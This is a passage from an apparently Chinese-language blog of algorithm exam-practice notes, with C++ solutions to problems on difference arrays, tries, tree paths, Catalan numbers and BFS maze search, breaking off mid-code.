<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">		map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; mm;</span><br><span class="line">		<span class="type">int</span> a[n+<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			a[i] = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> cnt = <span class="number">0</span>, begin, end;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">			cin &gt;&gt; begin &gt;&gt; end;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(j &gt;= begin &amp;&amp; j &lt;= end &amp;&amp; a[j] == <span class="number">1</span>)&#123;</span><br><span class="line">					a[j] = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[i] == <span class="number">1</span>) cnt ++;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了下别人的，有个方法叫差分数组，就是用一个数组维护原数组前一个对后一个的差，如果要统一修改[a,b]之间的值只需要在a、b两点修改差分数组就行了，复杂度只有on</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> 		<span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">		<span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">		<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(n+<span class="number">2</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">		<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">d</span><span class="params">(n+<span class="number">2</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">		<span class="type">int</span> l, r;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">			cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">			l++;</span><br><span class="line">			r++;</span><br><span class="line">			d[l]--;</span><br><span class="line">			d[r+<span class="number">1</span>]++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n+<span class="number">2</span>; i++)&#123;</span><br><span class="line">			a[i] = d[i] + a[i<span class="number">-1</span>];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n+<span class="number">2</span>; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[i] &gt; <span class="number">0</span>)</span><br><span class="line">				cnt ++;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除了被改的区域一直--外，其他区域都恒为1</p>
<h3 id="刷出一道墙">刷出一道墙</h3>
<h5 id="题目描述-26">题目描述</h5>
<p>在一面很长的墙壁上，工人们用不同的油漆去刷墙，然而可能有些地方刷过以后觉得不好看，他们会重新刷一下。有些部分因为重复刷了很多次覆盖了很多层油漆，小诺很好奇那些地方被刷过多少种颜色的油漆。</p>
<h5 id="输入输出格式-24">输入输出格式</h5>
<h6 id="输入描述-26">输入描述:</h6>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">若干行输入，每行两个数字B<span class="comment">[i]</span>,E<span class="comment">[i]</span>(0&lt;=B<span class="comment">[i]</span>&lt;=E<span class="comment">[i]</span>&lt;=200000)表示这次刷的墙壁是哪一段</span><br><span class="line">（假设每次刷的时候油漆颜色都和之前的不同），以0 0结束</span><br><span class="line">又若干行输入，每行两个数字begin<span class="comment">[i]</span>,end<span class="comment">[i]</span>（0&lt;=begin<span class="comment">[i]</span>&lt;=end<span class="comment">[i]</span>&lt;=200000）表示小诺询问的段，</span><br><span class="line">以0 0结束</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-26">输出描述:</h6>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">对于每个小诺的询问输出(<span class="keyword">end</span>[i]-<span class="keyword">begin</span>[i]+<span class="number">1</span>)行,表示对应询问段的每个点被多少种颜色的油漆覆盖过。</span><br></pre></td></tr></table></figure>
<p>还是差分数组，不知道为啥我的一直过不了~试了改scanf和去掉cout的缓冲区都不行</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> l, r, m = <span class="number">0</span>;</span><br><span class="line">	<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">20005</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">	<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">d</span><span class="params">(<span class="number">20005</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l, &amp;r) != EOF)&#123;</span><br><span class="line">		<span class="keyword">if</span>(l == <span class="number">0</span> &amp;&amp; r == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		l++;</span><br><span class="line">		r++;</span><br><span class="line">		d[l]++;</span><br><span class="line">		d[r+<span class="number">1</span>]--;</span><br><span class="line">		m = <span class="built_in">max</span>(r, m);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">		a[i] = d[i] + a[i<span class="number">-1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l, &amp;r) != EOF)&#123;</span><br><span class="line">		<span class="keyword">if</span>(l == <span class="number">0</span> &amp;&amp; r == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		l++;</span><br><span class="line">		r++;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = l; i &lt;= r; i++)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="前缀树">前缀树</h2>
<h3 id="前缀字符串">前缀字符串</h3>
<h5 id="题目描述-27">题目描述</h5>
<p>如果一个字符串s1是由另一个字符串s2的前面部分连续字符组成的，那么我们就说s1就是s2的前缀。比如“ac”是“acm”的前缀，“abcd”是“abcddfasf”的前缀，特别的“kdfa”是“kdfa”的前缀。
现在给你一些字符串，你的任务就是从这些字符串中找出一些字符串放到一个集合中，使得这个集合中任意一个字符串不是其他字符串的前缀，并且要使集合里的字符串尽可能的多。输出这个集合中字符串的个数。</p>
<h5 id="输入输出格式-25">输入输出格式</h5>
<h6 id="输入描述-27">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">有多组测试数据。每组测试数据以一个整数<span class="built_in">n</span>开头，随后有<span class="built_in">n</span>个字符串。 当<span class="built_in">n</span>=<span class="number">0</span>时表示输入结束。</span><br><span class="line"><span class="number">0</span>&lt;<span class="built_in">n</span>&lt;<span class="number">100</span>，字符串长度不大于<span class="number">20</span>。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-27">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">每组测试数据输出一个整数，即所求的最大值。每组数据占一行。</span><br></pre></td></tr></table></figure>
<p>构建一颗前缀树，求它的叶子节点个数即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">26</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">int</span> ct;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *next[maxn];</span><br><span class="line">&#125; *Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initTree</span><span class="params">(Tree &amp;r)</span></span>&#123;</span><br><span class="line">	r-&gt;ct = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxn; i++)&#123;</span><br><span class="line">		r-&gt;next[i] = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">buildTree</span><span class="params">(Tree &amp;r, string s)</span></span>&#123;</span><br><span class="line">	Tree p = r, q;</span><br><span class="line">	<span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		<span class="type">int</span> k = s[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;next[k] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">			q = <span class="keyword">new</span> node;</span><br><span class="line">			q-&gt;ct = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; maxn; j++)&#123;</span><br><span class="line">				q-&gt;next[j] = <span class="literal">NULL</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			p-&gt;next[k] = q;</span><br><span class="line">			p = p-&gt;next[k];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			p-&gt;next[k]-&gt;ct++;</span><br><span class="line">			p = p-&gt;next[k];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">countTree</span><span class="params">(Tree r)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	queue&lt;Tree&gt; q;</span><br><span class="line">	q.<span class="built_in">push</span>(r);</span><br><span class="line">	<span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">		Tree p = q.<span class="built_in">front</span>();</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxn; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;next[i] == <span class="literal">NULL</span>) tmp++;</span><br><span class="line">			<span class="keyword">else</span> q.<span class="built_in">push</span>(p-&gt;next[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(tmp == maxn) sum++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		Tree root = <span class="keyword">new</span> node;</span><br><span class="line">		<span class="built_in">initTree</span>(root);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			string s;</span><br><span class="line">			cin &gt;&gt; s;</span><br><span class="line">			<span class="built_in">buildTree</span>(root, s);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="type">int</span> sum = <span class="built_in">countTree</span>(root);</span><br><span class="line">		cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是这题的数据量很小，我们也可以用map来搞定，记得每次存长度最大的那个</p>
<h3 id="北邮2019-二叉树">北邮2019 二叉树</h3>
<h5 id="题目描述-28">题目描述</h5>
<p>对二叉树，计算任意两个结点的最短路径长度。</p>
<h5 id="输入输出格式-26">输入输出格式</h5>
<h6 id="输入描述-28">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">第一行输入测试数据组数 <span class="built_in">T</span></span><br><span class="line">第二行输入 <span class="built_in">n</span> , m 。 <span class="built_in">n</span> 代表输入的数据组数， m 代表要查询的数据组数。</span><br><span class="line">接下来 <span class="built_in">n</span> 行，每行输入两个数，代表<span class="number">1</span>~ <span class="built_in">n</span> 结点的孩子结点，如果没有孩子结点则输入-<span class="number">1</span>，根节点为<span class="number">1</span>。</span><br><span class="line">接下来 m 行，每行输入两个数，代表要查询的两个结点。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-28">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">每组测试数据输出 m 行，代表查询的两个结点之间的最短路径长度。</span><br></pre></td></tr></table></figure>
<p>找最小公共祖先</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">10000</span>;</span><br><span class="line"><span class="type">int</span> f[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findminipath</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">	<span class="keyword">while</span>(f[a] != <span class="number">1</span>)&#123;</span><br><span class="line">		res.<span class="built_in">push_back</span>(a);</span><br><span class="line">		a = f[a];</span><br><span class="line">	&#125;</span><br><span class="line">	res.<span class="built_in">push_back</span>(a);</span><br><span class="line">	<span class="keyword">if</span>(a != <span class="number">1</span>) res.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> t, n, m;</span><br><span class="line">	cin &gt;&gt; t;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; i++)&#123;</span><br><span class="line">		cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">		f[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="type">int</span> l, r;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">			cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">			<span class="keyword">if</span>(l != <span class="number">-1</span>)&#123;</span><br><span class="line">				f[l] = j+<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(r != <span class="number">-1</span>)&#123;</span><br><span class="line">				f[r] = j+<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">			cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">			vector&lt;<span class="type">int</span>&gt; lp = <span class="built_in">findminipath</span>(l);</span><br><span class="line">			vector&lt;<span class="type">int</span>&gt; rp = <span class="built_in">findminipath</span>(r);</span><br><span class="line">			<span class="type">int</span> idx1=lp.<span class="built_in">size</span>() - <span class="number">1</span>, idx2 = rp.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(;idx1&gt;=<span class="number">0</span>, idx2&gt;=<span class="number">0</span>; idx1--, idx2--)&#123;</span><br><span class="line">				<span class="keyword">if</span>(lp[idx1] != rp[idx2])&#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			cout &lt;&lt; idx1+idx2+<span class="number">2</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="有向树形态">有向树形态</h3>
<h5 id="题目描述-29">题目描述</h5>
<p>求N个结点能够组成的二叉树的个数。 1&lt;=n&lt;=20</p>
<h5 id="输入输出格式-27">输入输出格式</h5>
<h6 id="输入描述-29">输入描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">见题目</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-29">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">见题目</span><br></pre></td></tr></table></figure>
<p>卡特兰数，n较小直接递推，加上记忆化搜索</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> a[<span class="number">25</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	a[<span class="number">0</span>] = <span class="number">1</span>, a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++)&#123;</span><br><span class="line">		<span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">			ans += a[j] * a[i-j<span class="number">-1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		a[i] = ans;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; a[n] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="南京理工-树的高度">南京理工-树的高度</h3>
<h5 id="题目描述-30">题目描述</h5>
<p>树是一种特殊的图结构，有根树是一个有固定根的树。现在给定一棵有根树，编程求出树中所有节点到指定的根节点最远距离。</p>
<h5 id="输入输出格式-28">输入输出格式</h5>
<h6 id="输入描述-30">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">第一行是两个整数<span class="built_in">N</span>，M（<span class="number">1</span>&lt;=<span class="built_in">N</span>&lt;=<span class="number">10000</span>,<span class="number">1</span>&lt;=M&lt;=<span class="built_in">N</span>），表示数的顶点数和根节点的编号，接下来<span class="built_in">N</span>-<span class="number">1</span>行，每行两个整数u,v（<span class="number">1</span>&lt;=u,v&lt;=<span class="built_in">N</span>），表示编号为u的节点和编号为v的节点间有一条边。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-30">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输出距离根节点最远的点到根的距离。</span><br></pre></td></tr></table></figure>
<p>BFS算法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;edge;</span><br><span class="line">	<span class="type">int</span> deep;</span><br><span class="line">	<span class="type">bool</span> visit;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">node</span>()&#123;</span><br><span class="line">		deep = <span class="number">0</span>;</span><br><span class="line">		visit = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	node nod[<span class="number">10000</span>];</span><br><span class="line">	queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> u, v;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++)&#123;</span><br><span class="line">		cin &gt;&gt; u &gt;&gt; v;</span><br><span class="line">		nod[u].edge.<span class="built_in">push_back</span>(v);</span><br><span class="line">		nod[v].edge.<span class="built_in">push_back</span>(u);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> max = <span class="number">1</span>;</span><br><span class="line">	nod[m].deep = <span class="number">1</span>;</span><br><span class="line">	nod[m].visit = <span class="literal">true</span>;</span><br><span class="line">	q.<span class="built_in">push</span>(m);</span><br><span class="line">	<span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">		<span class="type">int</span> now = q.<span class="built_in">front</span>();</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nod[now].edge.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!nod[nod[now].edge[i]].visit)&#123;</span><br><span class="line">				nod[nod[now].edge[i]].visit = <span class="literal">true</span>;</span><br><span class="line">				nod[nod[now].edge[i]].deep = nod[now].deep + <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span>(max &lt; nod[nod[now].edge[i]].deep) max = nod[nod[now].edge[i]].deep;</span><br><span class="line">				q.<span class="built_in">push</span>(nod[now].edge[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; max - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h1 id="搜索">搜索</h1>
<h3 id="迷宫">迷宫</h3>
<h5 id="题目描述-31">题目描述</h5>
<p>Time Limit: 1000 ms Memory Limit: 256 mb</p>
<p>小 A 同学现在被困在了一个迷宫里面，他很想从迷宫中走出来，他可以
向上、向下、向左、向右移动、每移动一格都需要花费 1 秒的时间，不能够走到
边界之外。假设小 A 现在的位置在 S，迷宫的出口在 E，迷宫可能有多个出口。
问小 A 想要走到迷宫出口最少需要花费多少秒？</p>
<h5 id="输入输出格式-29">输入输出格式</h5>
<h6 id="输入描述-31">输入描述:</h6>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">有多组测试数据。</span><br><span class="line">第一行输入两个正整数 <span class="built_in">H</span>（<span class="number">0</span> &lt; <span class="built_in">H</span> &lt;= <span class="number">100</span>）和 W（<span class="number">0</span> &lt; W &lt;= <span class="number">100</span>），分别表示迷</span><br><span class="line">宫的高和宽。</span><br><span class="line">接下来 <span class="built_in">H</span> 行，每行 W 个字符（其中‘*’表示路，‘<span class="comment">#’表示墙，‘S’表示小 A</span></span><br><span class="line">的位置，‘E’表示迷宫出口）。</span><br><span class="line">当 <span class="built_in">H</span> 与 W 都等于 <span class="number">0</span> 时程序结束。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-31">输出描述:</h6>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">输出小 <span class="selector-tag">A</span> 走到迷宫出口最少需要花费多少秒，如果永远无法走到出口则输出“-<span class="number">1</span>”。</span><br></pre></td></tr></table></figure>
<p>BFS，注意struct的初始化</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">char</span> m[maxn][maxn];</span><br><span class="line"><span class="type">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">int</span> x, y;</span><br><span class="line">	<span class="type">int</span> step;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">	queue&lt;node&gt; q;</span><br><span class="line">	node s = &#123;x, y, <span class="number">0</span>&#125;;</span><br><span class="line">	q.<span class="built_in">push</span>(s);</span><br><span class="line">	vis[x][y] = <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">		node now = q.<span class="built_in">front</span>();</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="keyword">if</span>(m[now.x][now.y] == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">			ans = now.step;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">			<span class="type">int</span> nx = now.x + dir[i][<span class="number">0</span>];</span><br><span class="line">			<span class="type">int</span> ny = now.y + dir[i][<span class="number">1</span>];</span><br><span class="line">			<span class="keyword">if</span>((m[nx][ny]==<span class="string">&#x27;*&#x27;</span>||m[nx][ny]==<span class="string">&#x27;E&#x27;</span>) &amp;&amp; vis[nx][ny]==<span class="number">0</span>)&#123;</span><br><span class="line">				node tmp = &#123;nx, ny, now.step+<span class="number">1</span>&#125;;</span><br><span class="line">				q.<span class="built_in">push</span>(tmp);</span><br><span class="line">				vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> h, w;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; h &gt;&gt; w)&#123;</span><br><span class="line">		<span class="keyword">if</span>(h==<span class="number">0</span> &amp;&amp; w==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">memset</span>(m, <span class="number">0</span>, <span 